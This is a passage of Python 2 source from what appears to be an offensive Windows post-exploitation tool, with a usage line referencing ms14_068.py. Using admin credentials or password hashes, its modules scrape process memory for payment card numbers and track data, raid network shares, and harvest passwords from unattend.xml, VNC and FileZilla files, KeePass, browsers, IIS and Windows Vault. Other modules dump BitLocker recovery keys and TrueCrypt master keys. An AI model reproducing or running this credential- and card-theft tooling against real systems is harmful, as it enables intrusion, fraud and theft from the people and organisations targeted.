        selectedProcessList=[] 
        selectedProcess=''        
        while len(selectedOption)<1:
            print tabulate(tmpResultList2)   
            print "[*] Please enter a number or enter '*' to dump and search all processes:"        
            selectedOption=raw_input()
        selectedHostList=[]
        for x in tmpResultList2:  
            if str(selectedOption)==str(x[0]) or str(selectedOption)=="*":                
                selectedProcess=x[1]
                selectedProcessList.append(x[1])
                tmpSelectedHosts=x[2]
                if "," in tmpSelectedHosts:
                    tmpList1=tmpSelectedHosts.split(",")
                    for g in tmpList1:
                        g=g.strip()
                        if g not in selectedHostList:
                            selectedHostList.append(g)
                else:
                    if x[2] not in selectedHostList:
                        selectedHostList.append(x[2])
        if len(selectedHostList)>0:
            for x in accessAdmHostList:
                ip=x[0]
                domain=x[1]
                username=x[2]
                password=x[3]
                if ip in selectedHostList:
                    for selectedProcess in selectedProcessList:
                        print "[*] Dumping Process '"+selectedProcess+"' on Host: "+ip   
                        tmpResultList=memCredDump(ip,domain,username,password,passwordHash,selectedProcess)
                        if "Access is denied" not in str(tmpResultList):
                            for y in tmpResultList:
                                y=y.strip()
                                if len(y)>0:
                                    if "CARD NUM:" in y:
                                        y=y.split("CARD NUM:")[1]
                                        y=y.strip()
                                        if len(y):
                                            if cardLuhnChecksumIsValid(y)==True:
                                                print y
                                    if "TRACK DATA:" in y:                                        
                                        y=y.split("TRACK DATA:")[1]
                                        y=y.strip()
                                        if len(y):
                                            print y
        os._exit(1)


if args.module=="shares":
    #python ms14_068.py 172.16.126.0/24 -d corp -u milo -p Password1 -M shares -o host=172.16.126.176
    svrFilterList=[]
    if args.module_options:
        if "host=" in args.module_options[0]:
            tmpip=(args.module_options[0]).replace("host=","")
            svrFilterList.append(tmpip)
    if len(accessAdmHostList)>0:
        tmpBlackList=[]
        tmpBlackList.append("Application Data")
        tmpBlackList.append("Cookies")
        tmpBlackList.append("Local Settings")
        tmpBlackList.append("NetHood")
        tmpBlackList.append("PrintHood")
        tmpBlackList.append("Recent")
        tmpBlackList.append("Start Menu")
        tmpBlackList.append("Templates")
        tmpBlackList.append("SendTo")
        tmpBlackList.append("Videos")
        tmpBlackList.append("Pictures")
        tmpBlackList.append("Music")
        tmpBlackList.append("Saved Games")
        tmpBlackList.append("Searches")
        tmpBlackList.append("Links")
        tmpBlackList.append("Contacts")
        tmpBlackList.append("ProgramData")
        tmpBlackList.append("Program Files")
        tmpBlackList.append("Program Files (x86)")
        if args.module_options:
            tmpFound=False
            for x in accessAdmHostList:
                tmpip=x[0]
                if tmpip in svrFilterList:
                    tmpFound=True
            print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            
            if tmpFound==False:
                print "No suitable hosts found"
        else:
            print (setColor("\nTesting Access to Shared Folders", bold, color="green"))            

        for x in accessAdmHostList:
            headers = ["IP", "Share/File","Status","Credentials"]
            tmpip=x[0]
            tmpdomain=x[1]
            tmpusername=x[2]
            tmppassword=x[3]
            try:
                if len(svrFilterList)>0:
                    if tmpip in svrFilterList:
                        allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
                else:
                    allowedList, deniedList=listRemoteShare(tmpip,tmpdomain, tmpusername, tmppassword)
                tmpOKList=[]
                tmpFailedList=[]
                credStr=tmpusername+"|"+tmppassword
                if len(allowedList)>0:
                    for x in allowedList:
                        tmpFound=False
                        for g in tmpBlackList:
                            if g.lower() in x[3].lower():
                                tmpFound=True
                        if tmpFound==False:
                            tmpOKList.append([x[0],str(x[3]),"[OK]",credStr])
                if len(deniedList)>0:
                    for x in deniedList:                  
                        tmpFailedList.append([x[0],str(x[3]),"[FAILED]"])

                if len(tmpFailedList)>0:
                    tmpUserPassList=[]
                    if len(userPassList)>0:
                        print "Testing credentials"
                        for z in userPassList:
                            tmpLoginOK,tmpAdminOK=testDomainCredentials(z[1],z[2],None,tmpip,z[0])
                            if tmpLoginOK==True:
                                tmpUserPassList.append(z)
                    if len(tmpFailedList)>0:
                        print "\nTesting access"
                        for z in tmpFailedList:
                            tmpFound=False
                            if tmpFound==False:
                                for y in tmpUserPassList:
                                    try:
                                        targetIP=z[0]
                                        filePath=z[1]
                                        tmpdomain=y[0]
                                        tmpusername=y[1]
                                        tmppassword=y[2]
                                        #if filePath=="share/finance":
                                        if accessRemoteShare(targetIP,filePath,tmpdomain, tmpusername, tmppassword)==True:
                                            credStr=tmpusername+"|"+tmppassword
                                            tmpOKList.append([targetIP,filePath,"[OK]",credStr])
                                            tmpFound=True
                                    except:
                                        continue
                    print tabulate(tmpOKList)

            except Exception as e:
                continue
if args.module=="reg":
    print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
        for y in results:    
            if y not in tmpResultList:     
                tmpResultList.append(y)
    if len(tmpResultList)>0:
        headers = ["Host","Reg Path", "Password/Hash"]
        print tabulate(tmpResultList,headers)

    print (setColor("\nFind Interesting Files", bold, color="green"))
    if len(accessAdmHostList)>0:
        for x in accessAdmHostList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
            if len(tmpFileList)>0:
                count=0
                for filename in tmpFileList:           
                    filename=filename.strip()
                    tmpFilename=(downloadFile(ip,domain,username,password,filename))
                    if len(tmpFilename)>0:
                        if count>0:
                            print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename

                        else:
                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
                        if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
                            tmpResultList=parseUnattendXML(tmpFilename)
                            if len(tmpResultList)>0:
                                headers = ["Username","Password"]
                                print tabulate(tmpResultList,headers,tablefmt="simple")
                                print "\n"
                        if "ultravnc.ini" in filename.lower():
                            tmpResultList=parseUltraVNC(tmpFilename)
                            for x in tmpResultList:
                                print "Password1: "+x[0]
                                print "Password2: "+x[1]
                        if "sitemanager.xml" in filename.lower():
                            tmpResultList=parseSiteManagerXML(tmpFilename)
                            headers = ["Host", "Username","Password"]
                            print tabulate(tmpResultList,headers,tablefmt="simple")                    
                        if ".txt" in filename.lower():
                            with open(tmpFilename) as f:
                                lines = f.read().splitlines()
                                count1=0
                                if len(lines)<10:
                                    for x in lines:
                                        x=x.strip()
                                        if count1<10:
                                            print x
                                    count1+=1
                        count+=1
if args.module=='keepass':
    print (setColor("\nDumping Keepass Passwords", bold, color="green"))
    tmpResultList=[]
    tmpDoneList=[]
    for x in accessAdmHostList:
        if x[0] not in tmpDoneList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            results=getKeepass(ip,domain,username,password,passwordHash)
            for y in results:
                if len(y)>0:
                    y=y.strip()
                    if [ip,y] not in tmpResultList:
                        tmpResultList.append([ip,y])
            tmpDoneList.append(x[0])

    if len(tmpResultList)>0:
        print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
        for x in tmpResultList:
            print x[0]+"\t"+x[1]
    else:
        print "No results found"

if args.module=="bitlocker":
    print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=getBitlockerKeys(ip,domain,username,password,passwordHash)
        for y in results:
            y=y.strip()
            if len(y)>0:
                tmpResultList.append([ip,y])
    if len(tmpResultList)>0:
        headers = ["IP","Bitlocker Keys"]
        print tabulate(tmpResultList,headers,tablefmt="simple")
    else:
        print "No results found"

if args.module=="truecrypt":
    print (setColor("\nDecrypting Truecrypt", bold, color="green"))
    tmpResultList=[]
    tmpDoneList=[]
    for x in accessAdmHostList:
        if x[0] not in tmpDoneList: 
            print "[*] Targeting Host: "+x[0]
            tmpDoneList.append(x[0])
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            getTruecrypt(ip,domain,username,password,passwordHash)

if args.module=="passwords":
    print (setColor("\nDumping PuTTY, WinSCP, Remote Desktop saved sessions, Filezilla, SuperPuTTY", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=sessionGopher(ip,domain,username,password,passwordHash)
        #for y in results:
        #    if len(y)>0:
        #        tmpResultList.append(y)
    #if len(tmpResultList)>0:
    #    print tabulate(tmpResultList,tablefmt="simple")
    #else:
    #    print "No results found"

    print (setColor("\nFind Interesting Registry Keys", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=findInterestingRegKeys(ip,domain,username,password,passwordHash)
        for y in results:    
            if y not in tmpResultList:     
                tmpResultList.append(y)
    if len(tmpResultList)>0:
        headers = ["Host","Reg Path", "Password/Hash"]
        print tabulate(tmpResultList,headers)

    print (setColor("\nFind Interesting Files", bold, color="green"))
    tmpDoneList=[]
    if len(accessAdmHostList)>0:
        for x in accessAdmHostList:
            if x[0] not in tmpDoneList:
                ip=x[0]
                domain=x[1]
                username=x[2]
                if len(x[3])==65 and x[3].count(":")==1:
                    passwordHash=x[3]
                    password=None
                else:
                    password=x[3]
                    passwordHash=None
                tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
                if len(tmpFileList)>0:
                    count=0
                    for filename in tmpFileList:           
                        filename=filename.strip()
                        tmpFilename=(downloadFile(ip,domain,username,password,filename))
                        if len(tmpFilename)>0:
                            if count>0:
                                print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename

                            else:
                                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
                            if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
                                tmpResultList=parseUnattendXML(tmpFilename)
                                if len(tmpResultList)>0:
                                    headers = ["Username","Password"]
                                    print tabulate(tmpResultList,headers,tablefmt="simple")
                                    print "\n"
                            if "ultravnc.ini" in filename.lower():
                                tmpResultList=parseUltraVNC(tmpFilename)
                                for x in tmpResultList:
                                    print "Password1: "+x[0]
                                    print "Password2: "+x[1]
                            if "sitemanager.xml" in filename.lower():
                                tmpResultList=parseSiteManagerXML(tmpFilename)
                                headers = ["Host", "Username","Password"]
                                print tabulate(tmpResultList,headers,tablefmt="simple")                    
                            if ".txt" in filename.lower():
                                with open(tmpFilename) as f:
                                    lines = f.read().splitlines()
                                    count1=0
                                    if len(lines)<10:
                                        for x in lines:
                                            x=x.strip()
                                            if count1<10:
                                                print x
                                        count1+=1
                            count+=1
            tmpDoneList.append(x[0])

    print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=getBitlockerKeys(ip,domain,username,password,passwordHash)
        for y in results:
            y=y.strip()
            if len(y)>0:
                tmpResultList.append([ip,y])
    if len(tmpResultList)>0:
        headers = ["IP","Bitlocker Keys"]
        print tabulate(tmpResultList,headers,tablefmt="simple")
    else:
        print "No results found"

    print (setColor("\nDumping Keepass Passwords", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        ip=x[0]
        domain=x[1]
        username=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            passwordHash=x[3]
            password=None
        else:
            password=x[3]
            passwordHash=None
        results=getKeepass(ip,domain,username,password,passwordHash)
        for y in results:
            if len(y)>0:
                y=y.strip()
                if [ip,y] not in tmpResultList:
                    tmpResultList.append([ip,y])
    if len(tmpResultList)>0:
        print (setColor("\n[+]", bold, color="green"))+" List of Keepass databases and passwords found"                
        for x in tmpResultList:
            print x[0]+"\t"+x[1]
    else:
        print "No results found"


    print (setColor("\nDumping Truecrypt Master Keys", bold, color="green"))
    tmpResultList=[]
    tmpDoneList=[]
    for x in accessAdmHostList:
        if x[0] not in tmpDoneList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            results=getTruecrypt(ip,domain,username,password,passwordHash)
            tmpDoneList.append(x[0])

    print (setColor("\nDumping Browser Passwords", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        tmpip=x[0]
        tmpdomain=x[1]
        tmpusername=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            tmppasswordHash=x[3]
            tmppassword=None
        else:
            tmppassword=x[3]
            tmppasswordHash=None
        results=dumpBrowser(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)
        if len(results)>0:
            for y in results:
                if y not in tmpResultList:
                    tmpResultList.append(y)
    if len(tmpResultList)>0:
        print tabulate(tmpResultList,tablefmt="simple")

    print (setColor("\nIIS Credentials", bold, color="green"))
    tmpResultList=[]
    tmpDoneList=[]
    for x in accessAdmHostList:
        if x[0] not in tmpDoneList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            results=dumpIIS(ip,domain,username,password,passwordHash)
            for y in results:
                tmpResultList.append(y)
        tmpDoneList.append(x[0])
    if len(tmpResultList)>0:
        print tabulate(tmpResultList,tablefmt="simple")
    else:
        print "No results found"

    print setColor('\nWindows Vault Credentials', bold, color='green')
    tmpResultList=[]
    tmpDoneList=[]
    for x in accessAdmHostList:
        if x[0] not in tmpDoneList:
            ip=x[0]
            domain=x[1]
            username=x[2]
            if len(x[3])==65 and x[3].count(":")==1:
                passwordHash=x[3]
                password=None
            else:
                password=x[3]
                passwordHash=None
            results=runDumpVault(ip,domain,username,password,passwordHash)
            for y in results:
                tmpResultList.append(y)
        tmpDoneList.append(x[0])
    if len(tmpResultList)>0:
        print tabulate(tmpResultList,tablefmt="simple")
    else:
        print "No results found"

if args.module=="apps":
    print (setColor("\nList of Installed Programs", bold, color="green"))
    tmpResultList=[]
    for x in accessAdmHostList:
        tmpip=x[0]
        tmpdomain=x[1]
        tmpusername=x[2]
        if len(x[3])==65 and x[3].count(":")==1:
            tmppasswordHash=x[3]
            tmppassword=None
        else:
            tmppassword=x[3]
            tmppasswordHash=None
        tmpAppList=getInstalledPrograms(tmpip,tmpdomain,tmpusername,tmppassword,tmppasswordHash)        
        for y in tmpAppList:
            tmpResultList.append(y)
    if len(tmpResultList)>0:
        headers = ["Host","Software", "Version"]
        print tabulate(tmpResultList,headers,tablefmt="simple")
cleanUp()
os._exit(0)

